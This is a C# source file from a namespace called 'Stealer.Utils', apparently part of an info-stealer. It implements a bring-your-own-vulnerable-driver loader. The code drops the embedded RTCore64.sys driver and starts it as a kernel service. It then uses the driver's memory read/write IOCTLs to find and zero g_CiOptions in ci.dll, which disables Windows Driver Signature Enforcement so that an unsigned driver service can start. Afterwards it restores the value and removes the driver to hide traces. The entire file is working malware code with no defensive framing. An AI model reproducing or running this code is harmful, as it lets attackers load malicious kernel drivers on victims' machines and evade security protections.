using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace Stealer.Utils
{
    internal static class BYOVDLoader
    {
        // ── Win32 / Native APIs ────────────────────────────────────────────────

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtQuerySystemInformation(
            int SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            out int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateFile(
            string lpFileName, uint dwAccess, uint dwShare,
            IntPtr lpSA, uint dwCreation, uint dwFlags, IntPtr hTemplate);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(
            IntPtr hDev, uint dwCode,
            IntPtr lpIn, int nIn,
            IntPtr lpOut, int nOut,
            out int lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr OpenSCManager(string machine, string db, uint access);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateService(
            IntPtr hSCM, string name, string display, uint access,
            uint type, uint start, uint error,
            string binaryPath, string loadGroup, IntPtr tagId,
            string deps, string account, string password);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr OpenService(IntPtr hSCM, string name, uint access);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool StartService(IntPtr hSvc, uint argc, string[] argv);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DeleteService(IntPtr hSvc);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CloseServiceHandle(IntPtr h);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ControlService(IntPtr hSvc, uint ctrl, ref SERVICE_STATUS status);

        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS
        {
            public uint dwServiceType, dwCurrentState, dwControlsAccepted;
            public uint dwWin32ExitCode, dwServiceSpecificExitCode;
            public uint dwCheckPoint, dwWaitHint;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_MODULE_INFORMATION_ENTRY
        {
            public IntPtr Section;
            public IntPtr MappedBase;
            public IntPtr ImageBase;
            public uint ImageSize;
            public uint Flags;
            public ushort LoadOrderIndex;
            public ushort InitOrderIndex;
            public ushort LoadCount;
            public ushort OffsetToFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string FullPathName;
        }

        // RTCore64 IOCTL struct (0x30 bytes exact layout)
        [StructLayout(LayoutKind.Explicit, Size = 0x30)]
        private struct RTCORE64_READ_WRITE
        {
            [FieldOffset(0x00)] public uint Unknown0;
            [FieldOffset(0x04)] public uint Unknown1;
            [FieldOffset(0x08)] public ulong Address;
            [FieldOffset(0x10)] public uint Unknown2;
            [FieldOffset(0x14)] public uint Size;
            [FieldOffset(0x18)] public uint Value;
            [FieldOffset(0x1C)] public uint Unknown3;
        }

        private const uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
        private const int SystemModuleInformation = 11;
        private const uint GENERIC_READ_WRITE = 0xC0000000;
        private const uint FILE_SHARE_READ_WRITE = 3;
        private const uint OPEN_EXISTING = 3;

        private const uint SC_MANAGER_ALL = 0xF003F;
        private const uint SERVICE_ALL_ACCESS = 0xF01FF;
        private const uint SERVICE_KERNEL_DRIVER = 0x00000001;
        private const uint SERVICE_DEMAND_START = 0x00000003;
        private const uint SERVICE_ERROR_IGNORE = 0x00000000;
        private const uint SERVICE_CONTROL_STOP = 0x00000001;

        // RTCore64 IOCTLs
        private const uint RTCORE64_READ_IOCTL  = 0x80002048;
        private const uint RTCORE64_WRITE_IOCTL = 0x8000204C;

        private const string VULN_SERVICE_NAME = "RTCore64";
        private const string VULN_DEVICE_PATH  = @"\\.\RTCore64";

        // ── Public API ──────────────────────────────────────────────────────────

        public static bool DisableDSEAndStartService(IntPtr hSvc, out string errorMsg)
        {
            errorMsg = null;
            string vulnSysPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System),
                "drivers", "RTCore64.sys");

            bool vulnLoaded = false;
            try
            {
                // 1. Extract embedded RTCore64.sys and start service
                byte[] vulnBytes = GetEmbeddedDriverBytes("RTCore64.dat");
                if (vulnBytes != null && vulnBytes.Length > 0)
                {
                    File.WriteAllBytes(vulnSysPath, vulnBytes);
                    vulnLoaded = StartVulnDriver(vulnSysPath, out errorMsg);
                }
                else
                {
                    errorMsg = "BYOVD: Embedded RTCore64.dat resource not found";
                    return false;
                }

                if (!vulnLoaded)
                {
                    vulnLoaded = DeviceExists(VULN_DEVICE_PATH);
                }

                if (!vulnLoaded)
                {
                    if (string.IsNullOrEmpty(errorMsg)) errorMsg = "BYOVD: Failed to load RTCore64 driver";
                    return false;
                }

                IntPtr hDev = CreateFile(VULN_DEVICE_PATH, GENERIC_READ_WRITE,
                    FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

                if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
                {
                    errorMsg = "BYOVD: Failed to open device handle \\\\.\\RTCore64";
                    return false;
                }

                try
                {
                    // 2. Find g_CiOptions kernel address
                    string errDetail = null;
                    IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress(hDev, out errDetail);
                    if (gCiOptionsKernelAddr == IntPtr.Zero)
                    {
                        errorMsg = errDetail ?? "BYOVD: Failed to locate g_CiOptions symbol in ci.dll";
                        return false;
                    }

                    // 3. Read original g_CiOptions
                    uint originalOptions = ReadKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr);

                    // Write 0 to disable DSE on g_CiOptions and adjacent g_CiEnabled
                    if (!WriteKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr, 0))
                    {
                        errorMsg = "BYOVD: WriteKernelMemory32 failed to clear g_CiOptions";
                        return false;
                    }

                    // Also attempt write to adjacent g_CiEnabled location if present
                    WriteKernelMemory32WithHandle(hDev, new IntPtr(gCiOptionsKernelAddr.ToInt64() - 4), 0);

                    // Verification read after write
                    uint checkOptions = ReadKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr);

                    bool started = false;
                    try
                    {
                        started = StartService(hSvc, 0, null);
                        if (!started)
                        {
                            int sErr = Marshal.GetLastWin32Error();
                            if (sErr == 1056) started = true;
                            else errorMsg = "StartService failed after DSE patch (Win32 error " + sErr + ", addr=0x" + gCiOptionsKernelAddr.ToString("X") + ", orig=" + originalOptions + ", check=" + checkOptions + ")";
                        }
                    }
                    finally
                    {
                        // 4. Restore original g_CiOptions value
                        if (originalOptions != 0)
                        {
                            WriteKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr, originalOptions);
                        }
                        else
                        {
                            WriteKernelMemory32WithHandle(hDev, gCiOptionsKernelAddr, 6);
                        }
                    }

                    return started;
                }
                finally
                {
                    CloseHandle(hDev);
                }
            }
            catch (Exception ex)
            {
                errorMsg = "BYOVD Exception: " + ex.Message;
                return false;
            }
            finally
            {
                // 5. Cleanup vulnerable driver
                if (vulnLoaded)
                {
                    StopAndDeleteVulnDriver();
                    try { if (File.Exists(vulnSysPath)) File.Delete(vulnSysPath); } catch { }
                }
            }
        }

        // ── Helper Methods ──────────────────────────────────────────────────────

        private static byte[] GetEmbeddedDriverBytes(string resourceName)
        {
            try
            {
                Assembly asm = Assembly.GetExecutingAssembly();
                using (Stream s = asm.GetManifestResourceStream(resourceName))
                {
                    if (s == null) return null;
                    byte[] data = new byte[s.Length];
                    s.Read(data, 0, data.Length);
                    return data;
                }
            }
            catch { return null; }
        }

        private static bool StartVulnDriver(string sysPath, out string errorMsg)
        {
            errorMsg = null;
            IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
            if (hSCM == IntPtr.Zero)
            {
                int scmErr = Marshal.GetLastWin32Error();
                errorMsg = scmErr == 5 ? "OpenSCManager failed: Access Denied (Administrator privileges required)" : ("OpenSCManager failed (Win32 error " + scmErr + ")");
                return false;
            }
            try
            {
                IntPtr hOld = OpenService(hSCM, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (hOld != IntPtr.Zero)
                {
                    var st = new SERVICE_STATUS();
                    ControlService(hOld, SERVICE_CONTROL_STOP, ref st);
                    Thread.Sleep(200);
                    DeleteService(hOld);
                    CloseServiceHandle(hOld);
                }

                IntPtr hSvc = CreateService(
                    hSCM, VULN_SERVICE_NAME, VULN_SERVICE_NAME,
                    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                    sysPath, null, IntPtr.Zero, null, null, null);

                if (hSvc == IntPtr.Zero)
                {
                    int cErr = Marshal.GetLastWin32Error();
                    errorMsg = "CreateService RTCore64 failed (Win32 error " + cErr + ")";
                    return false;
                }
                try
                {
                    bool ok = StartService(hSvc, 0, null);
                    int err = Marshal.GetLastWin32Error();
                    if (!ok && err != 1056)
                    {
                        errorMsg = "StartService RTCore64 failed (Win32 error " + err + ")";
                    }
                    return ok || err == 1056;
                }
                finally { CloseServiceHandle(hSvc); }
            }
            finally { CloseServiceHandle(hSCM); }
        }

        private static void StopAndDeleteVulnDriver()
        {
            IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
            if (hSCM == IntPtr.Zero) return;
            try
            {
                IntPtr hSvc = OpenService(hSCM, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (hSvc == IntPtr.Zero) return;
                try
                {
                    var st = new SERVICE_STATUS();
                    ControlService(hSvc, SERVICE_CONTROL_STOP, ref st);
                    Thread.Sleep(300);
                    DeleteService(hSvc);
                }
                finally { CloseServiceHandle(hSvc); }
            }
            finally { CloseServiceHandle(hSCM); }
        }

        private static bool DeviceExists(string devicePath)
        {
            IntPtr h = CreateFile(devicePath, GENERIC_READ_WRITE,
                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (h == IntPtr.Zero || h == new IntPtr(-1)) return false;
            CloseHandle(h);
            return true;
        }

        private static bool GetModuleSections(IntPtr userBase, out uint textRva, out uint textSize, out uint dataRva, out uint dataSize)
        {
            textRva = 0; textSize = 0;
            dataRva = 0; dataSize = 0;
            try
            {
                int e_lfanew = Marshal.ReadInt32(new IntPtr(userBase.ToInt64() + 0x3C));
                IntPtr ntHeaders = new IntPtr(userBase.ToInt64() + e_lfanew);
                ushort numberOfSections = (ushort)Marshal.ReadInt16(new IntPtr(ntHeaders.ToInt64() + 0x06));
                ushort sizeOfOptionalHeader = (ushort)Marshal.ReadInt16(new IntPtr(ntHeaders.ToInt64() + 0x14));
                IntPtr sectionHeader = new IntPtr(ntHeaders.ToInt64() + 0x18 + sizeOfOptionalHeader);

                for (int i = 0; i < numberOfSections; i++)
                {
                    IntPtr sec = new IntPtr(sectionHeader.ToInt64() + (i * 40));
                    string secName = "";
                    for (int j = 0; j < 8; j++)
                    {
                        byte b = Marshal.ReadByte(sec, j);
                        if (b == 0) break;
                        secName += (char)b;
                    }
                    if (string.Equals(secName, ".text", StringComparison.OrdinalIgnoreCase))
                    {
                        textSize = (uint)Marshal.ReadInt32(sec, 8);
                        textRva = (uint)Marshal.ReadInt32(sec, 12);
                    }
                    else if (string.Equals(secName, ".data", StringComparison.OrdinalIgnoreCase))
                    {
                        dataSize = (uint)Marshal.ReadInt32(sec, 8);
                        dataRva = (uint)Marshal.ReadInt32(sec, 12);
                    }
                }
                return (textRva != 0 && dataRva != 0);
            }
            catch { }
            return false;
        }

        private static IntPtr FindGCiOptionsAddress(IntPtr hDev, out string errDetail)
        {
            errDetail = null;
            IntPtr ciKernelBase = GetKernelModuleBase("ci.dll");
            if (ciKernelBase == IntPtr.Zero)
            {
                errDetail = "BYOVD: GetKernelModuleBase(ci.dll) returned 0";
                return IntPtr.Zero;
            }

            string system32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string ciPath = Path.Combine(system32Path, "ci.dll");
            if (!File.Exists(ciPath))
            {
                errDetail = "BYOVD: ci.dll not found at " + ciPath;
                return IntPtr.Zero;
            }

            IntPtr userCiBase = LoadLibraryEx(ciPath, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
            if (userCiBase == IntPtr.Zero)
            {
                int lErr = Marshal.GetLastWin32Error();
                errDetail = "BYOVD: LoadLibraryEx(ci.dll) failed with Win32 error " + lErr;
                return IntPtr.Zero;
            }

            try
            {
                uint textRva, textSize, dataRva, dataSize;
                if (!GetModuleSections(userCiBase, out textRva, out textSize, out dataRva, out dataSize))
                {
                    textRva = 0x1000; textSize = 0x40000;
                    dataRva = 0x40000; dataSize = 0x10000;
                }

                IntPtr userTextStart = new IntPtr(userCiBase.ToInt64() + textRva);
                IntPtr kernelDataStart = new IntPtr(ciKernelBase.ToInt64() + dataRva);
                IntPtr kernelDataEnd = new IntPtr(kernelDataStart.ToInt64() + dataSize + 0x4000);

                byte[] code = new byte[textSize];
                Marshal.Copy(userTextStart, code, 0, (int)textSize);

                for (int i = 0; i < (int)textSize - 10; i++)
                {
                    int rel = 0;
                    IntPtr nextInstr = IntPtr.Zero;

                    // 1. mov [g_CiOptions], 6 -> C7 05 XX XX XX XX 06 00 00 00
                    if (code[i] == 0xC7 && code[i + 1] == 0x05 &&
                        code[i + 6] == 0x06 && code[i + 7] == 0x00 && code[i + 8] == 0x00 && code[i + 9] == 0x00)
                    {
                        rel = BitConverter.ToInt32(code, i + 2);
                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 10);
                    }
                    // 2. cmp [g_CiOptions], 0 / 6 -> 83 3D XX XX XX XX 00 / 06
                    else if (code[i] == 0x83 && code[i + 1] == 0x3D && (code[i + 6] == 0x00 || code[i + 6] == 0x06))
                    {
                        rel = BitConverter.ToInt32(code, i + 2);
                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 7);
                    }
                    // 3. Standard MOV relative (89 05 / 8B 05 / 89 0D / 8B 0D)
                    else if ((code[i] == 0x89 || code[i] == 0x8B) && ((code[i + 1] & 0xC7) == 0x05 || (code[i + 1] & 0xC7) == 0x0D))
                    {
                        rel = BitConverter.ToInt32(code, i + 2);
                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 6);
                    }
                    // 4. REX prefix MOV relative (44/48 89/8B)
                    else if ((code[i] == 0x44 || code[i] == 0x48) && (code[i + 1] == 0x89 || code[i + 1] == 0x8B) && ((code[i + 2] & 0xC7) == 0x05 || (code[i + 2] & 0xC7) == 0x0D))
                    {
                        rel = BitConverter.ToInt32(code, i + 3);
                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 7);
                    }

                    if (nextInstr != IntPtr.Zero)
                    {
                        IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
                        long offset = userTarget.ToInt64() - userCiBase.ToInt64();
                        IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);

                        if (cand.ToInt64() >= kernelDataStart.ToInt64() && cand.ToInt64() < kernelDataEnd.ToInt64())
                        {
                            uint val = ReadKernelMemory32WithHandle(hDev, cand);
                            if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || val == 0x2 || (val != 0 && (val & 6) != 0))
                            {
                                return cand;
                            }
                        }
                    }
                }

                errDetail = "BYOVD: Pattern scan found no g_CiOptions candidate in .text section (ciKernelBase=0x" + ciKernelBase.ToString("X") + ")";
                return IntPtr.Zero;
            }
            finally
            {
                FreeLibrary(userCiBase);
            }
        }

        private static IntPtr GetKernelModuleBase(string moduleName)
        {
            int size = 0;
            NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out size);
            if (size == 0) size = 1024 * 1024;

            IntPtr buffer = Marshal.AllocHGlobal(size + 16384);
            try
            {
                if (NtQuerySystemInformation(SystemModuleInformation, buffer, size + 16384, out size) != 0)
                    return IntPtr.Zero;

                int moduleCount = Marshal.ReadInt32(buffer);
                IntPtr currentModule = new IntPtr(buffer.ToInt64() + 8);

                for (int i = 0; i < moduleCount; i++)
                {
                    SYSTEM_MODULE_INFORMATION_ENTRY entry =
                        (SYSTEM_MODULE_INFORMATION_ENTRY)Marshal.PtrToStructure(
                            currentModule, typeof(SYSTEM_MODULE_INFORMATION_ENTRY));

                    string name = Path.GetFileName(entry.FullPathName);
                    if (string.Equals(name, moduleName, StringComparison.OrdinalIgnoreCase))
                    {
                        return entry.ImageBase;
                    }

                    currentModule = new IntPtr(currentModule.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_MODULE_INFORMATION_ENTRY)));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }

            return IntPtr.Zero;
        }

        private static uint ReadKernelMemory32WithHandle(IntPtr hDev, IntPtr kernelAddr)
        {
            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1)) return 0;
            try
            {
                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE();
                req.Address = (ulong)kernelAddr.ToInt64();
                req.Size = 4;

                int size = 0x30;
                IntPtr pReq = Marshal.AllocHGlobal(size);
                try
                {
                    Marshal.StructureToPtr(req, pReq, false);
                    int bytesReturned;
                    if (DeviceIoControl(hDev, RTCORE64_READ_IOCTL, pReq, size, pReq, size, out bytesReturned, IntPtr.Zero))
                    {
                        RTCORE64_READ_WRITE res = (RTCORE64_READ_WRITE)Marshal.PtrToStructure(pReq, typeof(RTCORE64_READ_WRITE));
                        return res.Value;
                    }
                }
                finally { Marshal.FreeHGlobal(pReq); }
            }
            catch { }
            return 0;
        }

        private static bool WriteKernelMemory32WithHandle(IntPtr hDev, IntPtr kernelAddr, uint value)
        {
            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1)) return false;
            try
            {
                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE();
                req.Address = (ulong)kernelAddr.ToInt64();
                req.Size = 4;
                req.Value = value;

                int size = 0x30;
                IntPtr pReq = Marshal.AllocHGlobal(size);
                try
                {
                    Marshal.StructureToPtr(req, pReq, false);
                    int bytesReturned;
                    return DeviceIoControl(hDev, RTCORE64_WRITE_IOCTL, pReq, size, pReq, size, out bytesReturned, IntPtr.Zero);
                }
                finally { Marshal.FreeHGlobal(pReq); }
            }
            catch { return false; }
        }
    }
}
